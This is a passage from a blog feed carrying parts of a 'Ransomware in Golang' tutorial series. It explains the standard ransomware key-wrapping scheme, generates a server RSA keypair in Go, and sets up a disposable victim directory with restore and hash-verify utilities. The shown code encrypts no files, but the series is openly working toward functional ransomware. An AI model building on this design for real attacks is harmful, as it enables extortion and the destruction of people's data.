<p>What happens if we try to encrypt 64? You can change the <code>p := []byte{...}</code> line to <code>p := make([]byte, 64)</code> and give it a shot. The function fails with the error <code>crypto/rsa: message too long for RSA public key size</code>.</p>

<p>Wow, look at all that stuff we just learned. Glad we chose to use RSA. <strong>Don&rsquo;t roll your own crypto</strong> is how they keep you <strong>IGNORANT</strong> of the government&rsquo;s <strong>MATH</strong> backdoors.</p>

<p><em>Disclaimer: We aren&rsquo;t rolling our own crypto here.</em></p>

<p>I&rsquo;ll do a post on ECDSA and U2F tokens in the future and we can learn a little bit about the government&rsquo;s new backdoored math.</p>

<p><em>Also Disclaimer: I have no evidence of backdoors.</em></p>

<h2>Standard Ransomware Crypto Scheme</h2>

<p>I mentioned in Post 0 that we&rsquo;ll be using the <a href="https://medium.com/@tarcisioma/ransomware-encryption-techniques-696531d07bb9">standard ransomware encryption scheme</a>. We will encrypt files with a symmetric key, we will encrypt those keys (they&rsquo;re small enough!) with the client&rsquo;s public key, and the client&rsquo;s private key will be encrypted with the server&rsquo;s public key. Follow that?</p>

<p>So the server&rsquo;s private key can decrypt the client&rsquo;s private key, which can in turn unlock the files&rsquo; encryption keys.</p>

<h2>De/Serialization</h2>

<p>That means we have to generate the server&rsquo;s keypair, save them, and be able to load them back up whenever the server starts. We also want to output the server&rsquo;s public key as bytes so that we can load them. Let&rsquo;s learn some terms.</p>

<p><strong>X.509</strong> - This is a <a href="https://en.wikipedia.org/wiki/X.509">standard</a> that defines the format of public key certificates.</p>

<p><strong>PKCS #1</strong> - <a href="https://en.wikipedia.org/wiki/PKCS_1">Public Key Cryptography Standards numero Uno</a>. This defined the RSA algorithm and properties.</p>

<p><strong>ASN.1</strong> - <a href="https://en.wikipedia.org/wiki/ASN.1">Abstract Syntax Notation 1</a> is an interface description format for defining data structures.</p>

<p><strong>DER</strong> - <a href="https://en.wikipedia.org/wiki/X.690#DER_encoding">Distinguished Encoding Rules</a> is a way to encode ASN.1 defined data. Described in the <code>X.690</code> standard, <code>nice0</code>.</p>

<h2>Key Generation</h2>

<p>Let&rsquo;s get to it then! We&rsquo;ll be generating a keypair, writing our RSA / PKCS1 keys out in an ASN.1 DER encoded format. For this one we&rsquo;re upping the bits to 2k48 because we&rsquo;ll be encrypting the client key (1k24 bits) and from our formula <code>(2048 bits - (32 bytes * 2 * 8 bits/byte) - 2) = 1534 bits</code>, AKA enough space to fit a 1024 bit key. We could go as low as a 1538 bit server key but using something that isn&rsquo;t a power of 2 would offend the divine numerology and our malware would no longer be blessed.</p>

<p>First, we don&rsquo;t want to overwrite our server keypair so we&rsquo;re going to check if those files exist.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">	_, errPub <span style="color:#f92672">:=</span> os.<span style="color:#a6e22e">Stat</span>(<span style="color:#e6db74">&#34;key.pub&#34;</span>)
	_, errPrv <span style="color:#f92672">:=</span> os.<span style="color:#a6e22e">Stat</span>(<span style="color:#e6db74">&#34;key.prv&#34;</span>)

	<span style="color:#66d9ef">if</span> errPub <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> <span style="color:#f92672">&amp;&amp;</span> errPrv <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
		pub, err <span style="color:#f92672">:=</span> ioutil.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#e6db74">&#34;key.pub&#34;</span>)
		<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
			log.<span style="color:#a6e22e">Fatal</span>(err)
		}
		<span style="color:#a6e22e">printBytes</span>(pub)
		log.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;keypair exists, will not overwrite&#34;</span>)	
	}
</pre>
<p>Following that, we generate a key, get the DER encoded bytes of the public key, write them to a file, ditto for the private key.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">	privateKey, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">GenerateKey</span>(rand.Reader, <span style="color:#ae81ff">2048</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	pub <span style="color:#f92672">:=</span> x509.<span style="color:#a6e22e">MarshalPKCS1PublicKey</span>(<span style="color:#f92672">&amp;</span>privateKey.PublicKey)
	err = ioutil.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#e6db74">&#34;key.pub&#34;</span>, pub, <span style="color:#ae81ff">0644</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	prv <span style="color:#f92672">:=</span> x509.<span style="color:#a6e22e">MarshalPKCS1PrivateKey</span>(privateKey)
	err = ioutil.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#e6db74">&#34;key.prv&#34;</span>, prv, <span style="color:#ae81ff">0644</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}
</pre>
<p>We also add a cute little <code>printBytes()</code> function to pretty print our public key in a way we can just paste into our client. Note, we also print the bytes when the keys exist because we might want to reprint those.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// util/genkey.go
</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;crypto/rand&#34;</span>
	<span style="color:#e6db74">&#34;crypto/rsa&#34;</span>
	<span style="color:#e6db74">&#34;crypto/x509&#34;</span>
	<span style="color:#e6db74">&#34;fmt&#34;</span>
	<span style="color:#e6db74">&#34;io/ioutil&#34;</span>
	<span style="color:#e6db74">&#34;log&#34;</span>
	<span style="color:#e6db74">&#34;os&#34;</span>
)

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">printBytes</span>(pub []<span style="color:#66d9ef">byte</span>) {
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;\tpub := []byte{&#34;</span>)
	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> pub {
		<span style="color:#66d9ef">if</span> i &gt; <span style="color:#ae81ff">0</span> {
			fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;,&#34;</span>)
		}

		<span style="color:#66d9ef">if</span> i<span style="color:#f92672">%</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
			fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;\n\t\t&#34;</span>)
		}

		fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34; 0x%02x&#34;</span>, pub[i])
	}
	fmt.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34; }&#34;</span>)
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	_, errPub <span style="color:#f92672">:=</span> os.<span style="color:#a6e22e">Stat</span>(<span style="color:#e6db74">&#34;key.pub&#34;</span>)
	_, errPrv <span style="color:#f92672">:=</span> os.<span style="color:#a6e22e">Stat</span>(<span style="color:#e6db74">&#34;key.prv&#34;</span>)

	<span style="color:#66d9ef">if</span> errPub <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> <span style="color:#f92672">&amp;&amp;</span> errPrv <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
		pub, err <span style="color:#f92672">:=</span> ioutil.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#e6db74">&#34;key.pub&#34;</span>)
		<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
			log.<span style="color:#a6e22e">Fatal</span>(err)
		}
		<span style="color:#a6e22e">printBytes</span>(pub)
		log.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;keypair exists, will not overwrite&#34;</span>)
	}

	privateKey, err <span style="color:#f92672">:=</span> rsa.<span style="color:#a6e22e">GenerateKey</span>(rand.Reader, <span style="color:#ae81ff">2048</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	pub <span style="color:#f92672">:=</span> x509.<span style="color:#a6e22e">MarshalPKCS1PublicKey</span>(<span style="color:#f92672">&amp;</span>privateKey.PublicKey)
	err = ioutil.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#e6db74">&#34;key.pub&#34;</span>, pub, <span style="color:#ae81ff">0644</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	prv <span style="color:#f92672">:=</span> x509.<span style="color:#a6e22e">MarshalPKCS1PrivateKey</span>(privateKey)
	err = ioutil.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#e6db74">&#34;key.prv&#34;</span>, prv, <span style="color:#ae81ff">0644</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	<span style="color:#a6e22e">printBytes</span>(pub)
}
</pre>
<p>Now we run it. I&rsquo;m going to do so in the <code>~/prog/rw/server/</code> directory which doesn&rsquo;t exist yet.</p>

<p>Worry if your&rsquo;s outputs the same key as mine and don&rsquo;t worry about the converse.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ mkdir server
$ cd server
$ go run ../util/genkey.go
	pub :<span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#f92672">]</span>byte<span style="color:#f92672">{</span>
		0x30, 0x82, 0x01, 0x0a, 0x02, 0x82, 0x01, 0x01,
		0x00, 0xb4, 0x10, 0x46, 0xf7, 0x7e, 0x73, 0x72,
		0x22, 0x4a, 0xcf, 0x98, 0xc8, 0x60, 0x67, 0x6c,
		0x96, 0x0b, 0xf9, 0x42, 0x5d, 0x05, 0xbf, 0x99,
		0x96, 0xe8, 0x69, 0xed, 0x95, 0xa4, 0x95, 0xbb,
		0xd2, 0x62, 0xa5, 0x35, 0x77, 0x97, 0x19, 0xc7,
		0x09, 0x92, 0x61, 0xd9, 0x5f, 0xea, 0x3e, 0x49,
		0xf5, 0x3f, 0x6f, 0x84, 0x21, 0x94, 0xc9, 0xda,
		0xfd, 0x20, 0x62, 0xc4, 0x61, 0x7c, 0x86, 0xfc,
		0xd6, 0x1f, 0xc8, 0x35, 0x2a, 0x78, 0xd5, 0x3e,
		0xb8, 0xd3, 0x3b, 0xa7, 0x3c, 0x9e, 0x82, 0x55,
		0xe3, 0x5b, 0x5c, 0x82, 0x50, 0xa5, 0x06, 0xf4,
		0x42, 0xfe, 0x93, 0xad, 0x61, 0x80, 0xff, 0xf2,
		0x8e, 0xe3, 0x78, 0xcb, 0xec, 0x91, 0x3f, 0x40,
		0xae, 0x71, 0x1f, 0x50, 0xb3, 0x1c, 0x1e, 0xdc,
		0x99, 0xed, 0xbb, 0x33, 0xe4, 0x6c, 0xb4, 0x84,
		0x18, 0x87, 0x51, 0xc7, 0x42, 0x0e, 0xa5, 0x80,
		0x4c, 0x36, 0xd2, 0xf2, 0x52, 0x58, 0x08, 0x26,
		0x6c, 0x36, 0x4b, 0x15, 0x22, 0x91, 0xd1, 0x92,
		0xcb, 0x82, 0x0f, 0xa8, 0x3f, 0xbe, 0x57, 0x2a,
		0xd0, 0xf2, 0x51, 0xa6, 0x3c, 0x92, 0xb9, 0x00,
		0x25, 0x23, 0xf4, 0x48, 0xa4, 0x8f, 0x09, 0xb4,
		0x5f, 0x42, 0x3f, 0x7d, 0x2d, 0xf8, 0xb0, 0x61,
		0x03, 0xcc, 0x93, 0x29, 0x63, 0x6a, 0xce, 0x1c,
		0x3f, 0x19, 0x7b, 0x03, 0x13, 0xd2, 0xd9, 0x99,
		0x85, 0x55, 0x2c, 0xfa, 0x19, 0x92, 0x18, 0x8a,
		0x39, 0x57, 0x4e, 0x22, 0xa3, 0x39, 0x93, 0xaa,
		0x5b, 0xaa, 0x2f, 0x2a, 0x41, 0xcb, 0xb6, 0xbc,
		0xde, 0x29, 0xe1, 0xbf, 0x4b, 0xbb, 0xac, 0x38,
		0x00, 0x1b, 0x4f, 0xb8, 0x4f, 0x39, 0xf6, 0xb0,
		0x0d, 0x92, 0x49, 0x0b, 0x60, 0x25, 0x15, 0xd2,
		0xad, 0xfa, 0x56, 0xb1, 0x0a, 0x94, 0xfc, 0xdc,
		0x55, 0xb9, 0x52, 0xe6, 0x64, 0x93, 0x85, 0x36,
		0x23, 0x02, 0x03, 0x01, 0x00, 0x01 <span style="color:#f92672">}</span>
$ ls 
key.prv  key.pub
</pre>
<h2>Conclusion</h2>

<p>Hopefully now we understand what asymmetric encryption is. We know that RSA has many pitfalls but Go provides some sane defaults as long as you can read. We can also generate the keypair for our server (yay).</p>

<p>In the next post we will get to write our ransomware client (also yay).</p>

<p>Now fuck off and do some exercise in the sun.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Wed, 16 Dec 2020 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Building Blocks - Ransomware in Golang Part 1</title>
      <link>https://tacix.at/posts/Building Blocks - Ransomware in Golang Part 1.html</link>
      <description>Environment and victim directory setup...</description>
      <content:encoded><![CDATA[<p>In case you missed it, check out <a href="https://tacix.at/posts/Ransomware%20in%20Golang%20-%20Part%200.html">Part 0</a> which will serve as our design doc and outline while we&rsquo;re building this.</p>

<h2>Setup</h2>

<p>To get started you’ll need to <a href="https://golang.org/dl/">download Go</a> and follow the <a href="https://golang.org/doc/install">install instructions</a> for your operating system. Then you’ll create a directory for this project, I’ll be working out of <code>~/prog/rw/</code> where <code>~</code> is my home directory on whatever OS I’m working on.</p>

<p>Golang is cross platform, and we&rsquo;re not doing anything platform specific, so you&rsquo;re free to work wherever you&rsquo;d like. However, if you&rsquo;re looking to learn some basic skills, now would be a great time to start working with virtual machines!</p>

<p>I&rsquo;ve made some YouTube videos on how to get started with VirtualBox, you can get the links at <a href="https://cybering.cc/#00">cybering.cc</a>. It&rsquo;s super easy, if you can click through two installers, you should have no problem. The videos help through a couple gotchas. So if you&rsquo;re looking to learn about VMs or Linux, both of which are great skills for jobbos, give it a shot! Your malware will then be contained in a VM, as all malware should be.</p>

<h2>Victim Directory</h2>

<p>Since we will be repeatedly running and debugging our encryptor, we will need to set up a victim directory so we’re not encrypting our own data, especially when we do not have a decryptor! This directory should be replaceable so we can reinitialize it with ease. We’ll have a master directory and a clone of it to be our directory under test. This way, restoring should be as simple as deleting the directory under test and replacing it with master.</p>

<p>Let’s make <code>_victim/</code> and seed it with some data. We have a few requirements. We want to have a handful of files that we can check for validity. When you are decrypting there are small things you can mess up, so we want to make sure our files match their originals exactly. Having multiple file types will also help us when we start filtering by extension. A single flat folder will not be realistic, so we will create a directory structure in order to simulate a real file system traversal.</p>

<p>Yours doesn&rsquo;t have to match mine exactly, but here is a good template structure.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">_victim/
	simple.txt
	pics/
		raylan.jpg
		hello.jpg
	docs/
		Resume.pdf
	prog/
		main.go
		main.exe
</pre>
<p>The file <code>simple.txt</code> is just a text file that has <code>Hello world!</code> in it. In <code>pics/</code> I have a picture of my dog and another file I found on the internet. The <code>docs/</code> folder contains my resume which I had sitting around.</p>

<p>For the dummy <code>prog/</code> folder, we can use this to test our Golang installation. My <code>main.go</code> file has the following contents.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;fmt&#34;</span>
)

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	fmt.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Greetings from Go!&#34;</span>)
}
</pre>
<p><em>We&rsquo;ll be working a lot from the command line. If you&rsquo;re on Linux the provided terminal is great. On Windows, you could use command prompt, but I generally work from <a href="https://conemu.github.io/">ConEmu</a>. If you want to learn some command line basics, I have some videos <a href="https://cybering.cc/#01">here</a>.</em></p>

<p>Normally, as I&rsquo;m working I just run my Go files with something like <code>go run main.go</code> on the command line. To produce an executable though, we can use <code>go build main.go</code>. On Windows this will produce <code>main.exe</code>, if you are working on Linux (probably OSX too) you will get an exectuable called <code>main</code>, either is fine.</p>

<h2>Restore and Verify</h2>

<p>We&rsquo;re going to create a small utility for restoring our victim directory, and also for verifying that things have been decrypted correctly. Let&rsquo;s make a new directory <code>~/prog/rw/util</code>, then create the file <code>util.go</code> in there.</p>

<h3>Restoration</h3>

<p>Restoration is pretty simple in an OS specific context. On Linux it would simply be <code>rm -r victim</code> and <code>cp -r _victim victim</code>. To reliably copy a directory recursively though, there are a lot of edge cases. Thankfully other people have already done the work on this. We&rsquo;re going to use the package <code>github.com/otiai10/copy</code>.</p>

<p>Since <code>github.com/otiai10/copy</code> is an external package, in order to import it we will need to run <code>go get github.com/otiai10/copy</code> on the command line. That will download the package and store it so we don&rsquo;t get an error like the following when we try to run our util program.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">util<span style="color:#960050;background-color:#1e0010">\</span>util.<span style="color:#66d9ef">go</span>:<span style="color:#ae81ff">5</span>:<span style="color:#ae81ff">2</span>: cannot find <span style="color:#f92672">package</span> <span style="color:#e6db74">&#34;github.com/otiai10/copy&#34;</span> in any of:
        c:<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">go</span><span style="color:#960050;background-color:#1e0010">\</span>src<span style="color:#960050;background-color:#1e0010">\</span>github.com<span style="color:#960050;background-color:#1e0010">\</span>otiai10<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">copy</span> (from <span style="color:#960050;background-color:#1e0010">$</span>GOROOT)
        C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>tacixat<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">go</span><span style="color:#960050;background-color:#1e0010">\</span>src<span style="color:#960050;background-color:#1e0010">\</span>github.com<span style="color:#960050;background-color:#1e0010">\</span>otiai10<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">copy</span> (from <span style="color:#960050;background-color:#1e0010">$</span>GOPATH)
</pre>
<p>We&rsquo;ll start with this in <code>util.go</code>. Give it a read through and I&rsquo;ll break it down section by section after. You can also try running it with <code>go run util/util.go</code>. Try adding on the flags <code>-verify</code> and <code>-restore</code> to the end of that and seeing how it handles them.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;flag&#34;</span>
	<span style="color:#e6db74">&#34;github.com/otiai10/copy&#34;</span>
	<span style="color:#e6db74">&#34;log&#34;</span>
	<span style="color:#e6db74">&#34;os&#34;</span>
)

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	restore <span style="color:#f92672">:=</span> flag.<span style="color:#a6e22e">Bool</span>(
		<span style="color:#e6db74">&#34;restore&#34;</span>, <span style="color:#66d9ef">false</span>, <span style="color:#e6db74">&#34;restore victim directory from _victim&#34;</span>)
	verify <span style="color:#f92672">:=</span> flag.<span style="color:#a6e22e">Bool</span>(
		<span style="color:#e6db74">&#34;verify&#34;</span>, <span style="color:#66d9ef">false</span>, <span style="color:#e6db74">&#34;verify files in victim directory&#34;</span>)

	flag.<span style="color:#a6e22e">Parse</span>()

	<span style="color:#66d9ef">if</span> !<span style="color:#f92672">*</span>restore <span style="color:#f92672">&amp;&amp;</span> !<span style="color:#f92672">*</span>verify <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>restore <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>verify {
		log.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;Requires one of -verify or -restore.&#34;</span>)
	}

	<span style="color:#66d9ef">if</span> <span style="color:#f92672">*</span>restore {
		err <span style="color:#f92672">:=</span> os.<span style="color:#a6e22e">RemoveAll</span>(<span style="color:#e6db74">&#34;victim&#34;</span>)
		<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
			log.<span style="color:#a6e22e">Fatal</span>(err)
		}

		err = copy.<span style="color:#a6e22e">Copy</span>(<span style="color:#e6db74">&#34;_victim&#34;</span>, <span style="color:#e6db74">&#34;victim&#34;</span>)
		<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
			log.<span style="color:#a6e22e">Fatal</span>(err)
		}
	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">*</span>verify {
		log.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;Verify not implemented yet!&#34;</span>)
	}
}
</pre>
<p>We start by importing a few packages. In Golang the packages should be listed in alphabetical order. You can do this automatically with <code>go fmt util/util.go</code>, which will tidy up other things about the file as well.</p>

<ul>
<li><a href="https://golang.org/pkg/flag"><code>flag</code></a> - Used for creating command line flags.</li>
<li><a href="https://pkg.go.dev/github.com/otiai10/copy"><code>github.com/otiai10/copy</code></a> - For copying our <code>_victim/</code> directory to <code>victim/</code>. Very straightforward package, only one function.</li>
<li><a href="https://golang.org/pkg/log"><code>log</code></a> - We&rsquo;ll use this one for printing instead of <code>fmt</code> and I&rsquo;ll explain the differences below.</li>
<li><a href="https://golang.org/pkg/os"><code>os</code></a> - Used to delete our current <code>victim/</code> directory, recursively.</li>
</ul>

<p>In our <code>main()</code> function we start by declaring two flags. The <code>:=</code> operator in Go is a short hand for declaring and defining a variable. This could also be done in two steps, like <code>var restore *Bool</code> and <code>restore = flag.Bool(...)</code> (the <code>*</code> here is saying it is a pointer type). The shorthand is nicer. Remember though, any assignment after declaration would just use <code>=</code>.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">	restore <span style="color:#f92672">:=</span> flag.<span style="color:#a6e22e">Bool</span>(
		<span style="color:#e6db74">&#34;restore&#34;</span>, <span style="color:#66d9ef">false</span>, <span style="color:#e6db74">&#34;restore victim directory from _victim&#34;</span>)
	verify <span style="color:#f92672">:=</span> flag.<span style="color:#a6e22e">Bool</span>(
		<span style="color:#e6db74">&#34;verify&#34;</span>, <span style="color:#66d9ef">false</span>, <span style="color:#e6db74">&#34;verify files in victim directory&#34;</span>)
</pre>
<p>These are pointers to booleans. Pointers are an address in memory that holds a value (in this case, a boolean value). In order to access the value, we dereference it with <code>*</code> when accessing the variable.</p>

<p>The next block is checking if either both <code>restore</code> and <code>verify</code> are false or both <code>restore</code> and <code>verify</code> are true. This is effectively an exclusive-or (xor). The <code>&amp;&amp;</code> (and) operator has a higher precendence than <code>||</code> (or). Think order of operations with multiplication and addition. If we either have both true or neither, we&rsquo;re going to call <code>log.Fatal(...)</code> which prints the message and exits the program.</p>

<p>The <code>log</code> package has a very similar API to <code>fmt</code>. The primary difference is that it prints to <code>stderr</code> instead of <code>stdout</code>, so it useful for program-related messages, rather than those meant for the end user. It also has nice utility functions like <code>Fatal</code> so we don&rsquo;t need to call both <code>fmt.Println(...)</code> and <code>sys.Exit(1)</code>.</p>

<p><em>If you need a referesher on boolean logic, check out video <a href="https://cybering.cc/#02">02.04</a>.</em></p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">	<span style="color:#66d9ef">if</span> !<span style="color:#f92672">*</span>restore <span style="color:#f92672">&amp;&amp;</span> !<span style="color:#f92672">*</span>verify <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>restore <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>verify {
		log.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;Requires one of -verify or -restore.&#34;</span>)
	}
</pre>
<p>If all goes well, and we have run the program with either <code>-verify</code> or <code>-restore</code> then we&rsquo;ll move onto our if statement. Looking at the second part first, we just bail if we call <code>-verify</code> right now. We&rsquo;ll implement that in a minute.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">*</span>verify {
		log.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;Verify not implemented yet!&#34;</span>)
	}
</pre>
<p>In our restore block we have two actions. The first is calling <code>os.RemoveAll()</code> on our <code>victim/</code> directory. This will recursively delete (meaning, delete the folder, and all of its contents) the current <code>victim/</code> dir. This is great when we have half of our ransomware working and we can encrypt the files but not recover them!</p>

<p>The pattern of <code>err = ...</code> and <code>if err != nil { ... }</code> is the standard pattern in Go for handling errors. This is to replace C-style errors where some functions return 0 for OK, and some return NULL (0) in error cases. Instead we just get an error, and the if the error is defined, we can handle it. In this case we handle it by printing it out and exiting the program. This is fine since we&rsquo;re not expecting to hit these errors very often.</p>

<p>The next block uses the <code>github.com/otiai10/copy</code> package to copy <code>_victim/</code> to <code>victim/</code>. Easy enough. Only thing to note, is see how we declare and define the first <code>err</code> with <code>:=</code> and the second we are just reassigning the existing <code>err</code> variable with <code>=</code>.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">		err <span style="color:#f92672">:=</span> os.<span style="color:#a6e22e">RemoveAll</span>(<span style="color:#e6db74">&#34;victim&#34;</span>)
		<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
			log.<span style="color:#a6e22e">Fatal</span>(err)
		}

		err = copy.<span style="color:#a6e22e">Copy</span>(<span style="color:#e6db74">&#34;_victim&#34;</span>, <span style="color:#e6db74">&#34;victim&#34;</span>)
		<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
			log.<span style="color:#a6e22e">Fatal</span>(err)
		}
</pre>
<h3>Verification</h3>

<p>Our goal with verification is to walk <code>_victim/</code> (the original) and for each file, <em>verify</em> that its SHA256 hash matches a corresponding file in <code>victim/</code>. There are three components to this.</p>

<ol>
<li>Reading files to get their bytes.</li>
<li>Taking the SHA256 of some bytes.</li>
<li>Walking a directory.</li>
</ol>

<p>Thankfully, these are all super easy to do. When I&rsquo;m working on projects I&rsquo;ll often have a <code>scratch/</code> directory where I prototype things and figure out how things work. I&rsquo;ll walk you through each of these in short scratch programs. Then we can put them together in <code>util.go</code>.</p>

<h4>Reading a file</h4>

<p>In Go, there are <a href="https://gobyexample.com/reading-files">a lot of ways</a> to read a file. We&rsquo;ll use a wrapper, <code>ioutil</code>, that will open and read the file then just give us back the slice of bytes (<code>bs</code>). We check the error and bail if we have one. Finally we cast our little slice of bytes to a string as we pass it to be printed out.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// scratch/read.go
</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;io/ioutil&#34;</span>
	<span style="color:#e6db74">&#34;log&#34;</span>
)

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	bs, err <span style="color:#f92672">:=</span> ioutil.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#e6db74">&#34;victim/simple.txt&#34;</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}
	log.<span style="color:#a6e22e">Println</span>(string(bs))
}
</pre>
<h4>Hashing some bytes</h4>

<p>Taking a SHA256 is equally as easy. We import <code>crypto/SHA256</code> and pass in a (string cast to) a slice of bytes to <a href="https://golang.org/pkg/crypto/sha256/#Sum256"><code>sha256.Sum256()</code></a>. That gives us back an array of 32 bytes which contains the hash. We print that as hex, giving us a 64 character string.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// scratch/sha256.go
</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;crypto/sha256&#34;</span>
	<span style="color:#e6db74">&#34;log&#34;</span>
)

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	input <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;Let&#39;s take the sha256 of these bytes!&#34;</span>
	hash <span style="color:#f92672">:=</span> sha256.<span style="color:#a6e22e">Sum256</span>([]byte(input))
	log.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%x\n&#34;</span>, hash)
}
</pre>
<p>If you&rsquo;re on Linux you can run the following to verify the output. It echos out the same string, <code>-n</code> for no trailing newline to match our input in the program. We pipe that to <code>sha256sum</code> and see that we&rsquo;re getting the same hash.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">echo -n <span style="color:#e6db74">&#34;Let&#39;s take the sha256 of these bytes!&#34;</span> | sha256sum
</pre>
